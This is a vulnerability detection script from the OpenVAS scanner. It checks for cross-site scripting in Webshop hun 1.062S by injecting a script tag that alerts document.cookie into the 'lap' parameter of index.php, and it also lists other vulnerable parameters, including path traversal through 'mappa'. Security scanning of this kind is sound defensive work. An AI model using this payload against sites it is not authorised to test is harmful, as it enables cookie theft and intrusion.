###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webshop_huh_mult_vuln.nasl 3499 2016-06-13 13:18:43Z benallard $
#
# Webshop hun Multiple Vulnerabilities
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805353");
  script_version("$Revision: 3499 $");
  script_cve_id("CVE-2015-2244, CVE-2015-2243, CVE-2015-2242");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-13 15:18:43 +0200 (Mon, 13 Jun 2016) $");
  script_tag(name:"creation_date", value:"2015-03-16 15:21:14 +0530 (Mon, 16 Mar 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Webshop hun Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Webshop hun
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaws are due to,
  - the 'param', 'center', 'lap','termid' and 'nyelv_id' parameter in index.php
    script not validated before returning it to users.
  - 'index.php' script is not properly sanitizing user input specifically path
    traversal style attacks (e.g. '../') via the 'mappa' parameter.
  - the index.php script not properly sanitizing user-supplied input via the
    'termid' and 'nyelv_id' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.

  Impact Level: Application");

  script_tag(name:"affected", value:"Webshop hun version 1.062S");

  script_tag(name: "solution" , value:"No Solution or patch is available as of
  16th March, 2015.Information regarding this issue will updated once the
  solution details are available.For updates refer to http://www.webshophun.hu");

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_summary("Check if Webshop hun is vulnerable to xss");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
http_port = get_http_port(default:80);
if (!http_port) {
  http_port = 80;
}

## Check the port status
if(!get_port_state(http_port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list_unique("/", "/webshop", cgi_dirs()))
{

  if( dir == "/" ) dir = "";

  ## Construct GET Request
  sndReq = http_get(item:dir + "/",  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  ##Confirm Application
  if(rcvRes && rcvRes =~ "Powered by Webshop hun")
  {
    ##Construct Attack Request
    url = dir + "/index.php?lap=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document.cookie\)</script>"))
     {
       report = report_vuln_url( port:http_port, url:url );
       security_message(port:http_port, data:report);
       exit(0);
     }
  }
}

exit(99);
